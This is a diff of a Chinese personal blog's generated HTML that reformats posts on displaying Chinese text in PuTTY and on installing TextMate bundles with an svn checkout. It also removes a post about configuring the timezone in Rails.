-<p><span style="font-family: Helvetica, Tahoma, Arial, sans-serif; line-height: 25px; text-align: left;">0.打开putty主程序，选择window-〉Appearance-〉Font settings-〉Change&#8230;,选择Fixedsys字体,字符集选择CHINESE_GB2312。 </span><br style="font-family: Helvetica, Tahoma, Arial, sans-serif; line-height: 25px; text-align: left;"><br style="font-family: Helvetica, Tahoma, Arial, sans-serif; line-height: 25px; text-align: left;"><span style="font-family: Helvetica, Tahoma, Arial, sans-serif; line-height: 25px; text-align: left;">1.在window-〉Appearance -〉Translation中，Received data assumed to be in which character set 中,把Use font encoding改为UTF-8如果经常使用,把这些设置保存在session里面. </span><br style="font-family: Helvetica, Tahoma, Arial, sans-serif; line-height: 25px; text-align: left;"><br style="font-family: Helvetica, Tahoma, Arial, sans-serif; line-height: 25px; text-align: left;"><span style="font-family: Helvetica, Tahoma, Arial, sans-serif; line-height: 25px; text-align: left;">2.现在打开putty,登录成功后,在shell中输入:export LC_ALL=&#8217;zh_CN.utf8&#8217; </span></p>
-
-
-<p style="text-align: left;"><span style="font-family: Helvetica, Tahoma, Arial, sans-serif;"><span style="line-height: 25px;">然后再打开文件就没问题了。</span></span></p>
-
+<p><p style="text-align: left;"><span style="font-family: Helvetica, Tahoma, Arial, sans-serif;"><span style="line-height: 25px;">然后再打开文件就没问题了。</span></span></p>
 </div>
   
   
@@ -873,92 +823,23 @@ show_result()&lt;/pre&gt;
   </header>
 
 
-  <div class="entry-content"><pre><code>        &lt;p&gt;截至目前，这是我买得最贵的一款软件了——39欧元（327RMB）&lt;/p&gt;
-</code></pre>
+  <div class="entry-content"><p>截至目前，这是我买得最贵的一款软件了——39欧元（327RMB）</p>
 
 <p>一直在豆瓣Textmate小组中等人家团购，自己也从没在官网试过购买，一看是用的paypal做中转，感觉不靠谱，以前也没试过paypal的支付，没想到这次成功了，先用了张信用卡支付，发现不行，结果换普通银行卡，直接跳转到了银联，然后我又用的信用卡透支……</p>
 
-
 <p>稍微配置了一下textmate，按照<a href="http://www.lixiaolai.com/archives/10895.html">这里</a>的方法，其中1.5版本的中文字体那里，建议不要尝试了，不完美，还是等2.0正式发布了吧，听说2.0对于中文字体支持得很好，但我懒得下载测试版来用：）</p>
-
 
 <p>加入GetBundles：</p>
 
+<pre class="prettyprint linenums bush:bash" lang="bash">mkdir -p ~/Library/Application\ Support/TextMate/Bundles
+cd !$
+svn co http://svn.textmate.org/trunk/Review/Bundles/GetBundles.tmbundle/
+osascript -e 'tell app "TextMate" to reload bundles'</pre>
 
-<br /><pre class="prettyprint linenums bush:bash" lang="bash">mkdir -p ~/Library/Application\ Support/TextMate/Bundles
 
-
-<p>cd !$
-svn co <a href="http://svn.textmate.org/trunk/Review/Bundles/GetBundles.tmbundle/">http://svn.textmate.org/trunk/Review/Bundles/GetBundles.tmbundle/</a>
-osascript -e &lsquo;tell app &ldquo;TextMate&rdquo; to reload bundles&rsquo;</pre></p>
-
-<br /><p>第一次见cd还能这样用，这样简直太方便了！还有最后那句script，多么优美的句子：）</p>
-
+<p>第一次见cd还能这样用，这样简直太方便了！还有最后那句script，多么优美的句子：）</p>
 
 <p>以后就要多用textmate了，先放弃emacs。</p>
-
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2012/02/15/set-timezone-in-rails/">设置Rails中的timezone</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2012-02-15T14:37:00+08:00" pubdate data-updated="true">Feb 15<span>th</span>, 2012</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><pre><code>        &lt;p&gt;Timezone是很关键的东西哦，特别是某些app根据时间来作出不同反映的时候设置好Timezone就是必须的了。&lt;/p&gt;
-</code></pre>
-
-<p>没设置之前，插入到数据库中的时间都是utc时间，晚8小时，修改两处就差不多正常了：）编辑config/application.rb，我用的是Rails3.2.1</p>
-
-
-<br /><pre class="prettyprint linenums bush:ruby" lang="ruby">config.active_record.default_timezone = :local  
-
-
-<p>config.time_zone = &lsquo;Beijing&rsquo;  </pre></p>
-
-<br /><p>为何我说差不多呢，原因如下：</p>
-
-
-<br /><pre class="prettyprint linenums bush:ruby" lang="ruby">irb(main):001:0&gt; Fpwd.store(1)
-
-
-<p>  Fpwd Load (0.2ms)  SELECT &ldquo;fpwds&rdquo;.* FROM &ldquo;fpwds&rdquo; WHERE &ldquo;fpwds&rdquo;.&ldquo;user_id&rdquo; = 1 LIMIT 1
-  SQL (2.7ms)  DELETE FROM &ldquo;fpwds&rdquo; WHERE &ldquo;fpwds&rdquo;.&ldquo;user_id&rdquo; = 1
-   (0.1ms)  begin transaction
-Binary data inserted for <code>string</code> type on column <code>randstring</code>
-  SQL (429.6ms)  INSERT INTO &ldquo;fpwds&rdquo; (&ldquo;created_at&rdquo;, &ldquo;randstring&rdquo;, &ldquo;updated_at&rdquo;, &ldquo;user_id&rdquo;) VALUES (?, ?, ?, ?)  [[&ldquo;created_at&rdquo;, Wed, 15 Feb 2012 14:29:35 CST +08:00], [&ldquo;randstring&rdquo;, &ldquo;87e685e0d2ab37143fae248083822ffea600f577&rdquo;], [&ldquo;updated_at&rdquo;, Wed, 15 Feb 2012 14:29:35 CST +08:00], [&ldquo;user_id&rdquo;, 1]]
-   (1.4ms)  commit transaction
-=&gt; #&lt;Fpwd user_id: 1, randstring: &ldquo;87e685e0d2ab37143fae248083822ffea600f577&rdquo;, created_at: &ldquo;2012-02-15 06:29:35&rdquo;, updated_at: &ldquo;2012-02-15 06:29:35&rdquo;&gt;</pre></p>
-
-<br /><p>最后的返回值那里还是晚了8小时，我用sqlite3查看的时候时间是正常的，所以这里怀疑是ruby的时间问题了，好在app中已经正常！</p>
-
 </div>
   
   
@@ -983,6 +864,10 @@ Binary data inserted for <code>string</code> type on column <code>randstring</co
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2013/06/15/some-sed-work/">Some-sed-work</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2013/05/18/dog-pile-effect/">Dog-pile-effect</a>
       </li>
     
@@ -996,10 +881,6 @@ Binary data inserted for <code>string</code> type on column <code>randstring</co
     
       <li class="post">
         <a href="/blog/2013/03/20/be-blocked-by-gfw/">be-blocked-by-GFW</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2013/03/18/end-sorted/">End-sorted</a>
       </li>
     
   </ul>
